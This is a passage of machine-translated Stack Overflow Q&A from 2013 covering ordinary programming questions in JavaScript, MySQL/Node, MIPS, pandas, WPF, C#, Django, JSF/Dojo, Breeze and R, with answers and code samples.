让我猜一猜：该数组不是已经按行和列的正确顺序排列（反之亦然）吗？例如，如果您的网格是四宽，那么第一行将是数组元素 0-3，第二行是 4-7，第三行是 8-11，等等。或者它可以是类似的排列方式沿着列向下排列。

假设它是按行顺序排列的，那么您根本不需要哈希表。该`initCacheLookup()`功能消失了，而是搜索代码如下所示：

```
var nCols = 4/*whatever*/;  // defined somewhere else
var itemWidth = 201, itemHeight = 221;

var tl = selectioncoords.topleft, br = selectioncoords.bottomright;
var left = Math.floor( tl.x / itemWidth );
var right = Math.floor( br.x / itemWidth );
var top = Math.floor( tl.y / itemHeight ) * nCols;
var bottom = Math.floor( br.y / itemHeight ) * nCols;

var items = self.cache.items;
var selecteditems = [];
for( var iRow = top;  iRow <= bottom;  iRow += nCols ) {
    for( var col = left;  col <= right;  col++ ) {
        var index = iRow + col;
        if( index < items.length ) {
            selecteditems.push( items[index] );
        }
    }
}
// Now selecteditems has the items intersecting the rectangle 
```

这段代码会快一点，也更简单。而且它完全不依赖于`item.box_pos`and `item.grid_pos`。您可能根本不需要这些数据字段，因为它们很容易从项目索引、网格列数以及项目高度和宽度计算出来。

一些相关说明：

不要硬编码`201`和`221`在代码中。仅将它们存储在变量中一次，然后在需要项目高度和宽度时使用这些变量。

您的数据结构中有很多重复。我建议您无情地消除所有重复的数据，除非有特殊需要。具体来说：

```
selectioncoords: {
    topleft: {
        x: 0,
        y: 0
    },
    topright: {
        x: 0,
        y: 0
    },
    bottomleft: {
        x: 0,
        y: 0
    },
    bottomright: {
        x: 0,
        y: 0
    },
    width: 0,
    height: 0
} 
```

这里一半以上的数据是重复的或可以计算的。这就是你所需要的：

```
selectioncoords: {
    left: 0,
    right: 0,
    top: 0,
    bottom: 0
} 
```

我提出这个问题的原因是在处理代码时有点令人困惑：“我想要左边缘。我是从`topleft.x`还是得到它`bottomleft.x`？它们真的像看起来一样吗？我该如何选择？”

此外，如上所述，如果项目存储在顺序数组中，则可能根本不需要`item.box_pos`and 。`item.grid_pos`如果需要它们，您可以只存储一个并从中计算另一个，因为两者之间存在直接关系：

```
box_pos.x === ( grid_pos.column - 1 ) * itemWidth
box_pos.y === ( grid_pos.row - 1 ) * itemHeight 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-27T21:49:16.303

如果系统设置为

*   self.cache.items 从左到右，从上到下排序
    *   (0,0),(1,0),(2,0),(0,1),(1,1),(1,2),(0,2),(1,2),(2 ,2)
*   每个空间都有一个项目
    *   好 - (0,0),(1,0),(2,0),(0,1),(1,1),(1,2),(0,2),(1,2), (2,2)
    *   坏 - (0,0),(2,0)(1,2),(1,3),(2,1),(2,3)
*   我们需要知道总列数。

所以代码让你开始。

```
// Some 'constants' we'll need.
number_of_columns = 4;
item_width = 201;
item_height = 221;

// First off, we are dealing with a grid system, 
// so that means that if given the starting x and y of the marquee,
// we can determine which element in the cache to start where we begin.
top_left_selected_index = Math.floor(selectioncoords.topleft.x / item_width) + (Math.floor(selectioncoords.topright.y / item_height) * number_of_columns );

// Now, because the array is in order, and there are no empty cache points, 
// we know that the lower bound of the selected items is `top_left_selected_index`
// so all we have to do is walk the array to grab the other selected.

number_columns_selected = (selectioncoords.bottomright.x - selectioncoords.topleft.x) / item_width;
// if it it doesn't divide exactly it means there is an extra column selected
if((selectioncoords.bottomright.x - selectioncoords.topleft.x) % item_width > 0){
  number_columns_selected += 1;
}

// if it it doesn't divide exactly it means there is an extra column selected
number_rows_selected = (selectioncoords.bottomright.y - selectioncoords.topleft.y) / item_height;
if((selectioncoords.bottomright.y - selectioncoords.topleft.y) % item_height > 0){
  number_rows_selected += 1;
}

// Outer loop handles the moving the pointer in terms of the row, so it
// increments by the number of columns.
// EX: Given my simple example array, To get from (1,0) to (1,1) 
// requires an index increase of 3
for(i=0; i < number_rows_selected; i++){
  // Inner loop marches through the the columns, so it is just one at a time.
  // Added j < number_of_columns in case your marquee stretches well past your content
  for(j=0; j < number_columns_selected && j < number_of_columns; j++){
    // Do stuff to the selected items.
    self.cache.items[top_left_selected_index + (i * number_of_columns) + j];
  }
} 
```

# mysql - node js db-mysql 命令不同步

> ID：15533073
> 
> 赞同：0
> 
> 时间：2013-03-20T19:36:30.100
> 
> 标签：mysql, node.js, stored-procedures

在尝试执行存储过程时，我偶尔会收到“命令不同步；您现在无法运行此命令”错误。

据我了解，问题是由于我在尝试再次调用该过程之前没有清理存储过程返回的附加结果集造成的。

我在网上看到了解决方案（[http://forums.mysql.com/read.php?52,140863,179132#msg-179132](http://forums.mysql.com/read.php?52,140863,179132#msg-179132)）：

```
while (mysqli_more_results($dbc)) { 
    if (mysqli_next_result($dbc)) { 
        $result = mysqli_use_result($dbc); 
        mysql_free_result($result); 
    }
} 
```

但我不确定如何在 db-mysql 中解决这个问题。

任何建议将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-21T20:27:38.607

我找不到解决方法，所以我写了一个[补丁](https://github.com/mariano/node-db-mysql/pull/101)。

# javascript - SyntaxHighlighter 为空

> ID：15533079
> 
> 赞同：0
> 
> 时间：2013-03-20T19:36:49.430
> 
> 标签：javascript, syntaxhighlighter

我正在使用[SyntaxHighlighter](http://alexgorbatchev.com/SyntaxHighlighter/manual/installation.html)。我按照安装步骤操作，在 firebug 控制台中收到一些错误：

> 类型错误：SyntaxHighlighter 为空
> 
> ReferenceError：未定义 XRegExp

我导入了必要的文件。

**标记**

![在此处输入图像描述](../Images/251198d61a5510fbc94249a0759d4dcb.png)

为什么我会收到这些错误？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T13:53:04.010

听起来您需要将 XRegExp.js 引用放在 shCore.js 引用之前。当存在依赖关系时，顺序确实很重要。最常见的示例之一是您必须先加载 jQuery，然后才能使用 jQueryUI。

# mips - 为单周期 MIPS 设计 ALU 控制块

> ID：15533087
> 
> 赞同：0
> 
> 时间：2013-03-20T19:36:58.320
> 
> 标签：mips, cpu-architecture, instruction-set, alu

希望这不是 Stack Overflow 的主题。

我正在学习 MIPS，但我一直卡在这一步。这是 ALU 控制块的真值表。

![图像](../Images/acb60b514770d007b68896f6ce2b5a23.png)

现在这是我第一次遇到如此复杂的真值表，其输入中包含无关条件。如果我将不关心扩展到 1 和 0（并保持其他所有内容相同），那么由于每个 X 的各种排列，表格将变得巨大。

为了简化电路或在计算机中计算，有没有其他简单的方法来简化这些表格？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T22:54:25.957

这是表格告诉您的伪代码：

```
if ALUop == 00b then operation = 010b 
else if ALUop0 == 1 then operation = 110b 
else operation is a function of F3,F2,F1,F0 
```

您可以使用[卡诺图](http://en.wikipedia.org/wiki/Karnaugh_map#Don.27t_cares)来最小化逻辑功能，包括无关值。这将使您能够`operation`根据 的值指定要选择的最小逻辑方程`F3,F2,F1,F0`。

# pandas - pandas 通过用户定义的名称访问轴

> ID：15533093
> 
> 赞同：0
> 
> 时间：2013-03-20T19:37:13.810
> 
> 标签：pandas, axis

我想知道是否有任何方法可以通过用户定义的名称而不是整数或“index”、“columns”、“minor_axis”等来访问 pandas 容器（DataFrame、Panel 等）的轴。

例如，使用以下数据容器：

```
df = DataFrame(randn(3,2),columns=['c1','c2'],index=['i1','i2','i3'])
df.index.name = 'myaxis1'
df.columns.name = 'myaxis2' 
```

我想这样做：

```
df.sum(axis='myaxis1') 
df.xs('c1', axis='myaxis2')  # cross section 
```

同样非常有用的是：

```
df.reshape(['myaxis2','myaxis1']) 
```

（在这种情况下不太相关，但如果尺寸增加，它可能会变得如此）

原因是我经常使用不同维度的多维数组，如“时间”、“变量”、“百分位数”等......并且同一段代码通常应用于可以是 DataFrame、Panel 的对象甚至是具有 MultiIndex 的 Panel4D 或 DataFrame。现在我经常对对象的形状或脚本的一般设置进行测试，以便知道哪个轴是相关的轴来计算总和或平均值。但是我认为忘记容器是如何在细节中实现的（DataFrame、Panel 等）会更方便，而只是考虑问题的性质（比如说我想随着时间的推移取平均值，我不想考虑我是在具有几个百分位数的“概率”模式下工作，还是在具有单个时间序列的“确定性”模式下工作）。

写这篇文章我已经（重新）发现了非常有用的轴属性。上面的代码可以翻译成：

```
nms = [ax.name for ax in df.axes]
axid1 = nms.index('myaxis1')
axid2 = nms.index('myaxis2')
df.sum(axis=axid1) 
df.xs('c1', axis=axid2)  # cross section 
```

和“重塑”功能（虽然不适用于 3-d 案例......）：

```
newshape = ['myaxis2','myaxis1']
axid = [nms.index(nm) for nm in newshape]
df.swapaxes(*axid) 
```

好吧，我不得不承认我在写这篇文章时已经找到了这些解决方案（这已经很方便了），但它可以概括为使用 MultiIndex 轴的 DataFrame（或其他），对所有轴和标签进行搜索...

在我看来，这将是对 pandas 的用户友好性的重大改进（好吧，忘记实际结构可能会产生性能成本，但担心性能的用户可以小心他/她如何组织数据）。

你怎么看？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:47:49.083

这仍然是实验性的，但看看这个页面：

[http://pandas.pydata.org/pandas-docs/dev/dsintro.html#panelnd-experimental](http://pandas.pydata.org/pandas-docs/dev/dsintro.html#panelnd-experimental)

```
import pandas
import numpy as np

from pandas.core import panelnd

MyPanel4D = panelnd.create_nd_panel_factory(
    klass_name   = 'MyPanel4D',
    axis_orders  = ['axis4', 'axis3', 'axis2', 'axis1'],
    axis_slices  = {'axis3': 'items',
                    'axis2': 'major_axis',
                    'axis1': 'minor_axis'},
    slicer       = 'Panel',
    stat_axis=2) 
mp4d = MyPanel4D(np.random.rand(5,4,3,2))
print mp4d 
```

结果在这个

```
<class 'pandas.core.panelnd.MyPanel4D'>
Dimensions: 5 (axis4) x 4 (axis3) x 3 (axis2) x 2 (axis1)
Axis4 axis: 0 to 4
Axis3 axis: 0 to 3
Axis2 axis: 0 to 2
Axis1 axis: 0 to 1 
```

这是警告，当您像`mp4d[0]`要取回面板一样对其进行切片时，除非您创建自定义对象的层次结构（不幸的是，需要等待 0.12-dev 才能支持“重命名”面板/数据帧，这并不重要并且没有任何要求）

因此，对于更暗淡的对象，您可以强加自己的名称结构。轴别名应该像你建议的那样工作，但我认为那里有一些错误

# c# - 如何根据 ViewModel 属性更改自定义类型的 DataTemplate？

> ID：15533095
> 
> 赞同：3
> 
> 时间：2013-03-20T19:37:24.327
> 
> 标签：c#, wpf, mvvm

我希望能够`DataTemplate`根据`ViewModel`.

我找不到任何明确的例子，我觉得我可能不够了解`WPF`或`XAML`不知道这是否可能。

我的`ViewModel`属性表示用户是否折叠了应用程序一侧的列。如果列折叠，我只想显示每个用户的图像，如果列展开，我将显示图片、名字和姓氏`StackPanel`。

我觉得有一些非常基本的东西我还不明白，我想我正在寻找可能尝试过这样的事情或知道如何以正确的方式做到这一点的人。

# 用户.cs

```
public class User
{
  public string ImageFile {get; set;}
  public string FirstName {get; set;}
  public string LastName {get; set;}
} 
```

我正在使用`ObservableCollection<User>`将我的`User`对象集合保存在视图模型中。我想使用的 2 个数据模板。（现在我只是使用默认图像和文本来查看它的外观）

# 数据模板

```
<DataTemplate x:Key="UserCollapsed">
  <Image Source="/Images/anon.png" 
         Height="50" 
         Width="50"
         Margin="0,5,0,0"/>
</DataTemplate>

<DataTemplate x:Key="UserExpanded">
  <StackPanel>
    <Image Source="/Images/anon.png" 
           Height="50" 
           Width="50"
           Margin="0,5,0,0"/>
     <TextBlock Text="Firstname"/>
     <TextBlock Text="Lastnamehere"/>
   </StackPanel>
 </DataTemplate> 
```

我尝试编写一个样式，并将其应用于视图中的 ItemsControl，并且我尝试编写一个使用触发器来决定使用哪个模板的数据模板，但我不太清楚我要去哪里错误的。

# 风格

```
<Style x:Key="userTemplateStyle" TargetType="ItemsControl">
  <Setter Property="ItemTemplate" Value="{StaticResource UserExpanded}"/>
  <Style.Triggers>
    <DataTrigger Binding="{Binding ColumnIsCollapsed, Source={StaticResource ViewModel}}" Value="True">
      <Setter Property="ItemTemplate" Value="{StaticResource UserCollapsed}"/>
    </DataTrigger>
  </Style.Triggers>
</Style> 
```

当我在 XAML 中的 ItemsControl 上添加 Style 属性时，出现以下异常。

# 例外

```
{"Unable to cast object of type 'MS.Internal.NamedObject' to type 'System.Windows.DataTemplate'."} 
```

以及我尝试用作 ItemsControl 的 ItemTemplate 的 DataTemplate。（我觉得这是错误的方法，但我还是尝试了）

# 数据模板

```
<DataTemplate DataType="{x:Type md:CUser}">
  <DataTemplate.Triggers>
    <DataTrigger Binding="{Binding ColumnIsCollapsed, Source={StaticResource ViewModel}}" Value="True">
      <Setter Property="DataTemplate" Value="{StaticResource UserCollapsed}"/>
    </DataTrigger>
  </DataTemplate.Triggers>
</DataTemplate> 
```

# 项目控制

```
<ItemsControl Visibility="{Binding ColumnVisibility}"
  Style="{StaticResource userTemplateStyle}"
  BorderThickness="0"
  Name="itcLoggedInUsers"
  Margin="0"
  ItemsSource="{Binding LoggedInUsers}"
  Grid.Row="1"/> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:13:41.917

你的代码对我来说很好......

```
<Window x:Class="WpfApplication8.MainWindow"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    xmlns:WpfApplication8="clr-namespace:WpfApplication8"
    Title="MainWindow"
    Width="525"
    Height="350">
<Window.Resources>
    <WpfApplication8:ViewModel x:Key="ViewModel" />
    <DataTemplate x:Key="UserCollapsed" />

    <DataTemplate x:Key="UserExpanded">
        <StackPanel Width="200"
                    Height="200"
                    Background="Red">
            <TextBlock Text="Firstname" />
            <TextBlock Text="Lastnamehere" />
        </StackPanel>
    </DataTemplate>
    <Style x:Key="userTemplateStyle" TargetType="ItemsControl">
        <Setter Property="ItemTemplate" Value="{StaticResource UserExpanded}" />
        <Style.Triggers>
            <DataTrigger Binding="{Binding ColumnIsCollapsed, Source={StaticResource ViewModel}}" Value="True">
                <Setter Property="ItemTemplate" Value="{StaticResource UserCollapsed}" />
            </DataTrigger>
        </Style.Triggers>
    </Style>
</Window.Resources>
<Grid x:Name="grid" DataContext="{StaticResource ViewModel}">
    <ItemsControl Name="itcLoggedInUsers"
                  Grid.Row="1"
                  Margin="0"
                  BorderThickness="0"
                  ItemsSource="{Binding LoggedInUsers}"
                  Style="{StaticResource userTemplateStyle}" />

</Grid> 
```

和 ViewModel

```
 public class ViewModel: INotifyPropertyChanged
{
    private bool _columnIsCollapsed;

    public ViewModel()
    {
        ColumnIsCollapsed = false;
        LoggedInUsers = new ObservableCollection<User>();
        LoggedInUsers.Add(new User(){FirstName = "SSSSSS", LastName = "XXXXXX"});
    }
    public bool ColumnIsCollapsed
    {
        get { return _columnIsCollapsed; }
        set
        {
            _columnIsCollapsed = value;
            OnPropertyChanged(new PropertyChangedEventArgs("ColumnIsCollapsed"));
        }
    }

    public ObservableCollection<User> LoggedInUsers { get; set; }

    public event PropertyChangedEventHandler PropertyChanged;

    public void OnPropertyChanged(PropertyChangedEventArgs e)
    {
        PropertyChangedEventHandler handler = PropertyChanged;
        if (handler != null) handler(this, e);
    }
}

public class User
{
    public string ImageFile { get; set; }
    public string FirstName { get; set; }
    public string LastName { get; set; }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:56:31.763

这个问题我想多了。如果我需要`DataTemplate`基于 的`boolean`属性显示或隐藏元素`ViewModel`，我可以将元素的可见性绑定到 的属性`ViewModel`，并使用转换器返回可见性。

# 解决方案

```
<DataTemplate DataType="{x:Type md:User}">
  <StackPanel>
    <Image Source="/Images/anon.png" 
           Height="50" 
           Width="50"
           Margin="0,5,0,0"/>
    <TextBlock Text="Firstname" Visibility="{Binding ColumnIsCollapsed, Source={StaticResource ViewModel},Converter={StaticResource InvertBoolVisibility}}"/>
    <TextBlock Text="Lastnamehere" Visibility="{Binding ColumnIsCollapsed, Source={StaticResource ViewModel},Converter={StaticResource InvertBoolVisibility}}"/>
  </StackPanel>
</DataTemplate> 
```

# 转换器

```
public class InvertBoolToVisibilityConverter : IValueConverter
{
  public object Convert(object value, Type targetType, object parameter, CultureInfo culture)
  {
    var theBool = (bool)value;
    if (theBool)
      return Visibility.Collapsed;
    else
      return Visibility.Visible;
  }

  public object ConvertBack(object value, Type targetType, object parameter, CultureInfo culture)
  {
    throw new NotImplementedException();
  }
} 
```

# c# - 需要 C# 数组帮助

> ID：15533099
> 
> 赞同：0
> 
> 时间：2013-03-20T19:37:41.247
> 
> 标签：c#, arrays, visual-studio, class

我是使用 C# 编程的初学者，我的讲师给了我们一个棘手的项目。我已经设法完成了所有这一切，除了......数组！

长话短说，我有 5 个文本框，它们都接受用户的输入。此信息将存储到一个数组中，然后按顺序（出生日期顺序）显示在富文本框中，我在下面列出了我设法执行的代码：

```
private void button2_Click(object sender, EventArgs e)
{
   {
      bc[0] = new Student();
      bc[1] = new Student(Convert.ToInt32(textBox1.Text), "Mary", "Ford");
      bc[2] = new Student(1254, "Andrew", "White");
      bc[3] = new Student(1256, "Liam", "Sharp", " ");
      bc[4] = new Student(1266, "Michael", "Brown", " ");

      for (int i = 0; i < 5; i++)
      {
         string bcString = bc[i].studentToString() + "\r\n"; 
         richTextBox1.AppendText(bcString);
      }
   }
}    

CLASS "Student":
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Assignment_2
{
    class Student
    {
        private int accountNum;
        private string firstName;
        private string lastName;
        private string balance;

        // first constructor
        public Student()
        {
            accountNum = 0;
            firstName = "";
            lastName = "";
            balance = "";
        }

        // second constructor
        public Student(int accValue, string firstNameVal, string lastNameVal)
        {
            accountNum = accValue;
            firstName = firstNameVal;
            lastName = lastNameVal;
            balance = "";
        }

        // third constructor
        public Student(int accValue, string firstNameVal,
                             string lastNameVal, string balanceValue)
        {
            accountNum = accValue;
            firstName = firstNameVal;
            lastName = lastNameVal;
            balance = balanceValue;
        }

        public int AccountNum
        {
            get
            {
                return accountNum;
            }

            set
            {
                accountNum = value;
            }
        }

        public string FirstName
        {
            get
            {
                return firstName;
            }

            set
            {
                firstName = value;
            }
        }

        public string studentToString()
        {
            return (Convert.ToString(accountNum) + " " + firstName +
                    " " + lastName + " " + balance);
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:52:24.190

让您的学生类实现 IComparable 接口，然后对字段 DateOfBirth（如果存在）进行排序。此示例适用于 AccountNum，但使用 DateOfBirth 进行更改应该很简单

```
Student[] bc = new Student[5];

bc[0] = new Student();
bc[1] = new Student(9999, "Mary", "Ford");
bc[2] = new Student(1254, "Andrew", "White");
bc[3] = new Student(1256, "Liam", "Sharp", " ");
bc[4] = new Student(1266, "Michael", "Brown", " ");

// Here the sort on the AccountNum
Array.Sort(bc);

// A StringBuilder instead of the RichTextBox for testing....    
StringBuilder sb = new StringBuilder();
for (int i = 0; i < 5; i++)
{
    string bcString = bc[i].studentToString() + "\r\n"; 
    sb.Append(bcString);
}
Console.WriteLine(sb.ToString()); 
```

学生：（只是 IComparable 的部分）

```
class Student : IComparable
{
    .....

    public int CompareTo(object obj) 
    {
        if (obj == null) return 1;

        Student otherStudent = obj as Student;
        if (otherStudent != null) 
            return this.accountNum.CompareTo(otherStudent.AccountNum);
        else 
        throw new ArgumentException("Object is not a Student");
    }
    ....

} 
```

# c# - 如何在 C# 中将带有元组的字典拆分为三个不同的字符串？

> ID：15533101
> 
> 赞同：0
> 
> 时间：2013-03-20T19:37:46.707
> 
> 标签：c#, asp.net

以下代表我的代码：

```
Dictionary<string, Tuple<string, string>> headCS = new Dictionary<string, Tuple<string, string>> { };

while (results.Read())
{
    headCS.Add(results["ID"].ToString(),
               new Tuple<string, string>(results["TEXT_HEADER"].ToString(), 
                                         results["TEXT_CONTENT"].ToString()));
}

valueIntroduction.InnerHtml = headCS.Values.ElementAt(0).ToString(); 
```

在`valueIntroduction.InnerHtml`中，它既有标题又有内容。现在我想分别拆分为 Header 和 Content 。但我想在一个字符串中分别获取标题和在字符串中分别获取内容。知道如何实现这一目标吗？

例如上面的输出是`(100, (Intro, My name is vimal))`。“100”代表key，“Intro”代表Header，“My name is vimal”代表Content。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:50:17.000

要从 a 中获取值，`Dictionary`您需要执行`foreach`以下操作`KeyValuePair`：

```
 Dictionary<string, Tuple<string, string>> headCS = new Dictionary<string, Tuple<string, string>>();

        List<string> key  = new List<string>();
        List<string> header = new List<string>();
        List<string> content = new List<string>();

        foreach (KeyValuePair<string, Tuple<string,string>> item in headCS)
        {
           //print values to console
            Console.WriteLine("{0},{1},{2}", item.Key, item.Value.Item1, item.Value.Item2);

            //store values for in another form just as an example of what they represent
            key.Add(item.Key);
            header.Add(item.Value.Item1);
            content.Add(item.Value.Item2);
        } 
```

# django - Django：如何直接从管理索引访问模型实例

> ID：15533105
> 
> 赞同：0
> 
> 时间：2013-03-20T19:37:59.920
> 
> 标签：django, django-admin

我想要一个首选项应用程序，其中只有一个包含一些全局设置的实例，例如。

```
# preferences/models.py
class Preferences(models.Model):
    site_title = models.CharField(max_length=255, blank=True)
    site_url = models.CharField(max_length=255, blank=True)
    logo = models.ImageField(upload_to="logo", null=True)

    def save(self, *args, **kwargs):
        if Preferences.objects.count() > 1:
            return
        super(Preferences, self).save(*args, **kwargs) 
```

保存覆盖的积分：这张[票](https://stackoverflow.com/a/2138495/1344854)。另外，我已经删除了添加按钮，再次感谢上述[票](https://stackoverflow.com/a/12469482/1344854)

```
# preferences/admin.py
class PreferencesAdmin(admin.ModelAdmin):
    def has_add_permission(self, request):
        num_objects = self.model.objects.count()
        if num_objects >= 1:
            return False
        else:
            return True

admin.site.register(Preferences, PreferencesAdmin) 
```

现在，我只想直接从管理索引页面跳转到我的 Preferences 模型的第一个也是唯一一个实例。有什么建议我怎么能做到这一点？感谢帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-24T15:38:21.130

找到了一个应用程序来做到这一点：[https](https://github.com/ionata/django-singletons) ://github.com/ionata/django-singletons 请 务必使用上面的 fork，因为原始[单例](https://github.com/tttallis/django-singletons)不适用于 Django 1.5

# jsf - 使用 Dojo 1.8 函数在 JSF ajax 结果上执行

> ID：15533106
> 
> 赞同：0
> 
> 时间：2013-03-20T19:38:05.247
> 
> 标签：jsf, jsf-2, dojo, dgrid

我是 Dojo 的新手（事实上所有前端编程，我多年来一直在使用 Java 和 C# 从事服务器端工作）。我目前正在使用 Java Server Faces (JSF) 2.1 并尝试将 JSF 和 Dojo Grid (dgrid) 与 Dojo 1.8 一起使用。我有一个来自 dgrid 站点的示例，它展示了如何制作甘特图，但这个示例没有展示如何从应用程序服务器中提取 JSON 数据并将其提供给函数。问题是我很难将我的大脑包裹在 ARM 周围——我希望那里的一些经验可以帮助减轻我的一些痛苦。这是一些代码：

这是在我创建的 html 文件中，加载时，它只是创建甘特图：

```
<script>
    require([ "gantt/GanttGrid", "gantt/data" ], function(GanttGrid, data){
        // Instantiate the GanttGrid using predefined test data
        new GanttGrid({
            store: data,
            query: {
                // Only tasks with no parent task should be displayed in the root of the chart
                parent: undefined
            }
        }, "gantt");
    });
</script> 
```

“数据”是从一个单独的 js 文件中提取的，只是被吞入 DOJO 的 Memory 对象的 JSON 数据：

```
define(["dojo/store/Memory"],function(Memory){
return new Memory({data:[
        {name: "100", start: 1327900000000, end: 1328300000000, completed: 0.9, id: 1},
        {name: "101", start: 1328100000000, end: 1328400000000, completed: 0.9, id: 2},
        {name: "102", start: 1329100000000, end: 1329800000000, completed: 0.4, dependencies:[1], id: 3},
        {name: "103", start: 1328400000000, end: 1328900000000, completed: 0.4, dependencies:[1], id: 4},
        {name: "104", start: 1329000000000, end: 1329800000000, completed: 0.4, id: 5},
        {name: "105", start: 1329000000000, end: 1329400000000, completed: 0.4, id: 6},
        {name: "106", start: 1329400000000, end: 1329800000000, completed: 0.4, id: 7}
    ],
    getChildren: function(parent, options){
        return this.query({parent: parent.id}, options);
    },
    mayHaveChildren: function(parent){
        return parent.hasChildren;
    }
});}); 
```

现在，我想要的是能够调用 JSF Managed Bean 的方法，该方法将在后端执行一些逻辑，然后返回我可以添加到 DOJO 的内存存储并将其传递到 GanttGrid 的 JSON 数据，但是，我似乎无法弄清楚如何使用 ajax 请求来解决这个问题。

这是我在 XHTML 文件中成功从 bean 获取数据并将其显示在屏幕上的内容：

```
<fieldset>
    <h:form id="schedulerForm">
        <h:commandButton value="Execute Demo" id="executeDemo">
            <f:ajax event="click" listener="#{autoScheduler.executeDemo}" render="result"  />
        </h:commandButton>
        <p />
        <h:outputText id="result" value="#{autoScheduler.result}"  />
    </h:form>
</fieldset> 
```

我想要的是在 JSF bean 上捕获 executeDemo 的结果，以传递给创建 GanttGrid 的函数。我曾尝试在 DOJO 中使用“on”功能，但这只允许我捕获按钮单击（据我所知）......我想不出一种方法来知道执行何时完成，以便我可以从 bean 中获取数据并创建图表。最大的问题是我不知道如何使用 DOJO 请求模块调用 JSF bean。

我希望有人知道一个简单的方法来实现这一点。提前感谢您的帮助！如果您需要更多信息，请告诉我...我试图包含所有相关代码。

-保罗

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-21T12:49:50.777

好吧，JSF 不允许使用 JavaScript 调用任意 Java 代码。它只允许您使用Javascript 对象触发调用调用 bean 方法的请求，如果 JSF 组件触发了它（例如，`commandButton`单击了 a） 。`jsf.ajax`在这里查看[API](http://docs.oracle.com/cd/E17802_01/j2ee/javaee/javaserverfaces/2.0/docs/js-api/symbols/jsf.ajax.html)。

这个 API 对 View 代码非常严格，它会触发请求以及对部分视图的更新。

例如，这里`commandButton`与您的非常相似，但使用 vanilla JavaScript 来触发 AJAX 而不是`f:ajax`标签，并添加了一些额外的 JS 代码：

```
<h:commandButton value="Execute Demo" id="executeDemo"
  onclick="console.log('hey, I am an arbitrary JS code');
  jsf.ajax.request(this, event, {execute:'@this', render: 'result'});
  return false;" /> 
```

此外，虽然`f:ajax`确实允许您在请求完成时执行 JavaScript 代码，但此时您确实不能“调用 java bean 代码”来获取您想要的数据。但是您可以使用 JSF Ajax 将数据放入 DOM，并在回调中从 DOM 中获取数据。

这是一个让您入门的示例，它获取 JSON 格式的数据：

一个简单的 Bean 方法返回一个带有 JSON 编码对象的字符串：

```
public String getMyData() {
    return "{\"fruit\": \"banana\"}";
} 
```

查看代码：

```
<fieldset>
    <h:form id="schedulerForm">
        <h:commandButton value="Execute Demo" id="executeDemo">
            <f:ajax event="click" listener="#{autoScheduler.executeDemo}"
               render="result myHiddenData" onevent="parseData()" />
        </h:commandButton>
        <p />
        <h:outputText id="result" value="#{autoScheduler.result}"  />
        <h:panelGroup id="myHiddenData" style="display: none">#{autoScheduler.myData}</h:panelGroup>
    </h:form>
    <script>
        function parseData(data){
            if (data.status == "success") {
                var myRawData = document.getElementById("schedulerForm:myHiddenData").innerHTML;
                var myJsonData = JSON.parse(myRawData);
                alert(myJsonData.fruit);
            }
        }
    </script>
</fieldset> 
```

另请参阅这些相关问题：

*   [使用 JSF AJAX 方法保持 JavaScript 模块范围](https://stackoverflow.com/questions/7306269/using-jsf-ajax-methods-to-keep-javascript-module-scope)
*   [JSF 2：如何在同一输入中显示不同的 ajax 状态？](https://stackoverflow.com/questions/7043840/jsf-2-how-show-different-ajax-status-in-same-input)

# javascript - Breeze 为使用 WebAPI 构建的应用程序提供什么价值？

> ID：15533111
> 
> 赞同：2
> 
> 时间：2013-03-20T19:38:19.343
> 
> 标签：javascript, jquery, breeze

如果这个问题过于笼统，请原谅我，但 Breeze 提供了什么价值？似乎最大的卖点是更改跟踪和精简的“最低限度”查询，但这不是服务层的责任吗？为什么在客户端上执行这些操作变得很方便？

我查看了这些示例，似乎很多服务器端的责任正在通过 Breeze 逐渐转移到客户端。传统上，我为应用程序中的不同场景使用不同的 DTO 构建了我的 SPA，以定义在线服务器端发生的事情。CRUDding 数据只是从 JS 进行正确的 API 调用的问题。

在我看来，这种策略使其他开发人员也更容易构建客户端。他们需要知道的只是 API 端点和 JSON 结构。随着微风，他们需要知道更多。

我只是很难看到这个库的价值——尽管我想！这里的任何信息/讨论都会很棒。干杯:)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T19:46:13.290

Breeze 使您可以轻松地在 JavaScript（视图模型）*客户端*创建查询并通过微风控制器推送您的查询。

Breeze 将实体框架包装到一个 JavaScript 框架中，并提供在客户端构建查询的能力，但*仍然*在服务器端执行它们。它包含许多附加功能，并通过 JavaScript 层使您的数据库数据完全可用。

呼吁一些努力：

*   它的 API 对 LINQ 来说很熟悉
*   更改跟踪（如您所述）
*   客户端缓存*（效率！）*
*   带有承诺的异步操作

当然，这取决于您的客户端应用程序的丰富程度。但是 SPA 是富 Internet 应用程序 ( [RIA](http://de.wikipedia.org/wiki/Rich_Internet_Application) )。由于其通常复杂的架构，Breeze 可以轻松实现设计良好的 JS 数据访问。

## 编辑

想象一下，您想要实现一个网格，它允许修改多个 DB 对象，例如`Person`s。第三方网格（如 Kendo）通常支持客户端验证以改善用户体验和带宽使用。尽管互联网应用程序必须在服务器端验证数据，但在将它们提交到后端之前，应该在客户端发现骨头错误。Breeze 为您提供客户端验证的轻松实施。

# r - 如何创建 R 的精简版本？

> ID：15533114
> 
> 赞同：4
> 
> 时间：2013-03-20T19:38:21.707
> 
> 标签：r

我正在尝试创建 R 的最小/精简版本。目标是在磁盘上占用很小的空间。RTerm 应该启动并支持基本功能，如创建内置类型（矩阵、数组、列表等）和简单数学（如矩阵乘法）。我正在使用 2.15.3 的标准 Windows 安装。

这是我到目前为止成功删除的内容：

*   根目录下的所有文件
*   大多数图书馆。我删除了默认情况下未附加的所有库。
*   “文档”目录
*   “测试”目录
*   'tcl' 目录
*   'src' 目录
